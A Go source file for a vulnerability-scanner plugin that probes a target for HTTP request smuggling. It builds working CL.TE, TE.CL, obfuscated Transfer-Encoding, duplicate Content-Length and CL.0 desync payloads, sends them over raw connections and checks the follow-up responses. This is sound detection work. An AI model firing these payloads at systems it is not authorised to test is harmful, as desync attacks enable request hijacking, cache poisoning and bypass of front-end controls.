package plugins

import (
	"DORM/models"
	"bufio"
	"bytes"
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"strconv"
	"strings"
	"time"
)

type RequestSmugglingPlugin struct{}

func (p *RequestSmugglingPlugin) Name() string { return "HTTP Request Smuggling (Advanced v2)" }

// randomMarker returns a short random hex string so each scan embeds a unique
// smuggled-request signature instead of a static, easily fingerprinted one.
func randomMarker() string {
	b := make([]byte, 5)
	if _, err := rand.Read(b); err != nil {
		return "dormrs"
	}
	return hex.EncodeToString(b)
}

// smuggleResponse is one HTTP response read off a raw connection.
type smuggleResponse struct {
	status int
	text   string // status line, headers and body
}

// smuggleRead is everything a connection returned before it went quiet.
type smuggleRead struct {
	responses []smuggleResponse
	timedOut  bool // nothing at all arrived before the first deadline
	closed    bool // the server closed the connection (EOF or reset)
}

// readSmuggleResponses reads from conn until it stays quiet for quiet (or
// nothing arrives within first), then splits what came back into HTTP
// responses. Reading until quiet matters: a server that answers the attack
// as two pipelined requests sends both answers at once, and they must not
// be mistaken for the answer to the probe that follows.
func readSmuggleResponses(conn net.Conn, first, quiet time.Duration) smuggleRead {
	var raw []byte
	var res smuggleRead
	buf := make([]byte, 16384)
	wait := first
	for len(raw) < 1<<20 {
		_ = conn.SetReadDeadline(time.Now().Add(wait))
		n, err := conn.Read(buf)
		raw = append(raw, buf[:n]...)
		if err != nil {
			var ne net.Error
			if errors.As(err, &ne) && ne.Timeout() {
				res.timedOut = len(raw) == 0
			} else {
				res.closed = true
			}
			break
		}
		wait = quiet
	}
	br := bufio.NewReader(bytes.NewReader(raw))
	for {
		resp, err := http.ReadResponse(br, nil)
		if err != nil {
			break
		}
		body, _ := io.ReadAll(resp.Body)
		_ = resp.Body.Close()
		var head strings.Builder
		_ = resp.Header.Write(&head)
		res.responses = append(res.responses, smuggleResponse{
			status: resp.StatusCode,
			text:   resp.Proto + " " + resp.Status + "\r\n" + head.String() + "\r\n" + string(body),
		})
	}
	return res
}

func (p *RequestSmugglingPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	marker := randomMarker()
	smugglePath := "/dorm-" + marker
	// smuggledRequest is a complete, harmless GET with its own Host header:
	// strict back-ends answer a Host-less HTTP/1.1 request with 400, which
	// hid a real desync. When a desync attack succeeds, these bytes are left
	// on the back-end connection and answered as a request of their own; the
	// front-end hands that answer to whatever request it forwards next.
	smuggledRequest := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nX-Dorm-Marker: %s\r\n\r\n", smugglePath, target.IP, marker)
	chunkBody := "0\r\n\r\n" + smuggledRequest // 0-size chunk terminates the "legit" body; the smuggled request follows

	// The follow-up probe asks for "/", a path that exists, and must get
	// what "/" gets after a request with consistent framing. It used to ask
	// for a random path, whose normal answer is itself a 404.
	probe := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", target.IP)

	connect := func() (net.Conn, error) {
		address := net.JoinHostPort(target.IP, strconv.Itoa(target.Port))
		dialer := &net.Dialer{Timeout: 5 * time.Second}
		if target.Port == 443 || target.Port == 8443 {
			return tls.DialWithDialer(dialer, "tcp", address, &tls.Config{InsecureSkipVerify: true})
		}
		return net.DialTimeout("tcp", address, 5*time.Second)
	}

	// smuggledAnswer reports whether r is the answer to the smuggled request:
	// a 404/405 that names the smuggled path. A server echoing our request
	// body back answers 200, not 404.
	smuggledAnswer := func(r smuggleResponse) bool {
		return (r.status == 404 || r.status == 405) && strings.Contains(r.text, smugglePath)
	}

	// cleanProbe sends a POST with consistent framing (a plain Content-Length
	// body of bodyLen bytes) and then the probe on the same connection: how
	// "/" is normally answered in that position. ok is false when the server
	// did not answer the POST alone, or closed the connection.
	type cleanResult struct {
		status  int
		stalled bool
		ok      bool
	}
	cleanProbe := func(bodyLen int) cleanResult {
		conn, err := connect()
		if err != nil {
			return cleanResult{}
		}
		defer func() { _ = conn.Close() }()
		clean := fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\nContent-Length: %d\r\n\r\n%s",
			target.IP, bodyLen, strings.Repeat("x", bodyLen))
		_ = conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		if _, err := conn.Write([]byte(clean)); err != nil {
			return cleanResult{}
		}
		if pre := readSmuggleResponses(conn, 5*time.Second, time.Second); len(pre.responses) != 1 || pre.closed {
			return cleanResult{}
		}
		_ = conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		if _, err := conn.Write([]byte(probe)); err != nil {
			return cleanResult{}
		}
		post := readSmuggleResponses(conn, 5*time.Second, 500*time.Millisecond)
		if len(post.responses) == 0 {
			return cleanResult{stalled: post.timedOut, ok: post.timedOut}
		}
		return cleanResult{status: post.responses[0].status, ok: true}
	}

	solution := "Disable HTTP/1.1 connection reuse (Keep-Alive) between the front-end and back-end, or normalize/validate Content-Length and Transfer-Encoding framing consistently at both layers."

	// sendAttackThenProbe writes the attack payload, reads every answer it
	// gets, then sends the probe on the SAME connection. A desynced back-end
	// answers the probe with the smuggled request's response (its 404), or
	// leaves the connection silent while it waits for bytes the smuggled
	// prefix consumed.
	//
	// A server that answers the attack with two responses parsed it as two
	// requests by itself: for CL.TE that is plain HTTP/1.1 (Transfer-Encoding
	// wins over Content-Length) followed by ordinary pipelining, and there is
	// no second component to disagree with it. Only CL.0 counts that case,
	// since a server answering a Content-Length body as a request ignored a
	// valid Content-Length (cl0 is true there).
	var sendAttackThenProbe func(attackPayload, attackName string, cl0, confirming bool) *models.Vulnerability
	sendAttackThenProbe = func(attackPayload, attackName string, cl0, confirming bool) *models.Vulnerability {
		conn, err := connect()
		if err != nil {
			return nil
		}
		defer func() { _ = conn.Close() }()

		_ = conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		if _, err := conn.Write([]byte(attackPayload)); err != nil {
			return nil
		}

		pre := readSmuggleResponses(conn, 3*time.Second, time.Second)
		if pre.closed {
			return nil
		}
		// The server rejected the attack and is closing the connection (Node
		// answers 400 to Content-Length plus Transfer-Encoding): nothing was
		// left on the connection to desync.
		for _, r := range pre.responses {
			if strings.Contains(strings.ToLower(r.text), "\r\nconnection: close") {
				return nil
			}
		}
		if len(pre.responses) > 1 {
			if !cl0 {
				return nil
			}
			for _, r := range pre.responses[1:] {
				if smuggledAnswer(r) {
					return &models.Vulnerability{
						Target:      target,
						Name:        "HTTP Request Smuggling (" + attackName + ")",
						Severity:    "CRITICAL",
						CVSS:        9.8,
						Description: fmt.Sprintf("The server answered the body of a POST with a valid Content-Length as a request of its own: the smuggled GET for %q got its own 404/405. Any front-end that honors the Content-Length (or a browser, for client-side desync) is desynced by such a request.\n\nPayload:\n%s", smugglePath, attackPayload),
						Solution:    solution,
						Reference:   "PortSwigger: HTTP Request Smuggling",
					}
				}
			}
			return nil
		}

		_ = conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		if _, err := conn.Write([]byte(probe)); err != nil {
			return nil
		}
		post := readSmuggleResponses(conn, 5*time.Second, 500*time.Millisecond)

		if len(post.responses) == 0 {
			// Only a real timeout counts: a reset is a closed connection, not
			// a back-end waiting for bytes. And the probe after a request with
			// consistent framing must be answered, or the stall is just how
			// this server treats any request.
			if !post.timedOut {
				return nil
			}
			if base := cleanProbe(len(attackPayload)); !base.ok || base.stalled {
				return nil
			}
			// The connection went silent after a request it should have
			// answered instantly — consistent with the back-end still
			// blocked on bytes the smuggled prefix consumed. Lower
			// confidence than a content match, reported as HIGH not CRITICAL.
			return &models.Vulnerability{
				Target:      target,
				Name:        "HTTP Request Smuggling (" + attackName + ", blind/timing)",
				Severity:    "HIGH",
				CVSS:        7.5,
				Description: fmt.Sprintf("After the %s attack request, a follow-up request for \"/\" on the same connection received no response before timeout, while the same request after a cleanly framed POST is answered — consistent with the back-end being desynced. Lower-confidence signal; verify manually before treating as confirmed.\n\nAttack payload:\n%s", attackName, attackPayload),
				Solution:    solution,
				Reference:   "PortSwigger: HTTP Request Smuggling",
			}
		}

		got := post.responses[0]
		if smuggledAnswer(got) {
			return &models.Vulnerability{
				Target:      target,
				Name:        "HTTP Request Smuggling (" + attackName + ")",
				Severity:    "CRITICAL",
				CVSS:        9.8,
				Description: fmt.Sprintf("A follow-up request for \"/\" on the same connection was answered with the smuggled request's response (a %d naming %q, marker %q) instead of its own — the %s request desynced the connection.\n\nAttack payload:\n%s", got.status, smugglePath, marker, attackName, attackPayload),
				Solution:    solution,
				Reference:   "PortSwigger: HTTP Request Smuggling",
			}
		}
		if got.status != 404 && got.status != 405 {
			return nil
		}
		// "/" answered 404/405 without naming our path: a desync whose 404
		// page does not echo the path, or this server's normal answer to "/"
		// after a POST. The clean sequence tells, and the attack must do it
		// again.
		if base := cleanProbe(len(attackPayload)); !base.ok || base.stalled || base.status == 404 || base.status == 405 {
			return nil
		}
		if !confirming && sendAttackThenProbe(attackPayload, attackName, cl0, true) == nil {
			return nil
		}
		return &models.Vulnerability{
			Target:      target,
			Name:        "HTTP Request Smuggling (" + attackName + ")",
			Severity:    "HIGH",
			CVSS:        8.1,
			Description: fmt.Sprintf("Twice, a follow-up request for \"/\" on the same connection got %d after the %s attack, while after a cleanly framed POST it gets its normal answer — the answer to the smuggled request for %q was handed to it. The 404 page does not name the path, so this is not tied to the marker; verify manually.\n\nAttack payload:\n%s", got.status, attackName, smugglePath, attackPayload),
			Solution:    solution,
			Reference:   "PortSwigger: HTTP Request Smuggling",
		}
	}

	// --- CL.TE: front-end honors Content-Length, back-end honors Transfer-Encoding ---
	clte := fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\nContent-Length: %d\r\nTransfer-Encoding: chunked\r\n\r\n%s",
		target.IP, len(chunkBody), chunkBody)
	if vuln := sendAttackThenProbe(clte, "CL.TE", false, false); vuln != nil {
		return vuln
	}

	// --- TE.CL: front-end honors Transfer-Encoding, back-end honors Content-Length ---
	// Chunk size is computed from the real request length (not hardcoded),
	// and the front Content-Length is sized to truncate right after the
	// chunk-size line, so only that line is consumed as "the body" by a
	// Content-Length-only parser, leaving smuggledRequest pipelined.
	chunkSizeHex := fmt.Sprintf("%x", len(smuggledRequest))
	teClBody := chunkSizeHex + "\r\n" + smuggledRequest + "\r\n0\r\n\r\n"
	frontCL := len(chunkSizeHex) + 2
	tecl := fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\nContent-Length: %d\r\nTransfer-Encoding: chunked\r\n\r\n%s",
		target.IP, frontCL, teClBody)
	if vuln := sendAttackThenProbe(tecl, "TE.CL", false, false); vuln != nil {
		return vuln
	}

	// --- TE.TE: obfuscated Transfer-Encoding header, hoping front-end and
	// back-end disagree on whether it's honored at all ---
	teteVariants := []struct{ name, header string }{
		{"TE.TE space-before-colon", "Transfer-Encoding : chunked"},
		{"TE.TE tab", "Transfer-Encoding:\tchunked"},
		{"TE.TE duplicate", "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity"},
		{"TE.TE chunked-param", "Transfer-Encoding: chunked, identity"},
		{"TE.TE obs-fold", "Transfer-Encoding:\r\n chunked"},
	}
	for _, v := range teteVariants {
		// Content-Length covers the whole body, as a front-end that ignores
		// the obfuscated header would read it. Without it the chunked body
		// was the request's only framing, and a server that honors it simply
		// answers the second request as ordinary HTTP pipelining.
		payload := fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\nContent-Length: %d\r\n%s\r\n\r\n%s",
			target.IP, len(chunkBody), v.header, chunkBody)
		if vuln := sendAttackThenProbe(payload, v.name, false, false); vuln != nil {
			return vuln
		}
	}

	// --- CL.CL: duplicate Content-Length headers with conflicting values ---
	shortBody := "x"
	fullBody := shortBody + smuggledRequest
	clcl := fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\nContent-Length: %d\r\nContent-Length: %d\r\n\r\n%s",
		target.IP, len(shortBody), len(fullBody), fullBody)
	if vuln := sendAttackThenProbe(clcl, "CL.CL", false, false); vuln != nil {
		return vuln
	}

	// --- CL.0: back-end treats the body as zero-length on some routes
	// (e.g. a static-file handler) while the front-end forwards it whole ---
	cl0 := fmt.Sprintf("POST /static/1 HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\nContent-Length: %d\r\n\r\n%s",
		target.IP, len(smuggledRequest), smuggledRequest)
	if vuln := sendAttackThenProbe(cl0, "CL.0", true, false); vuln != nil {
		return vuln
	}

	return nil
}
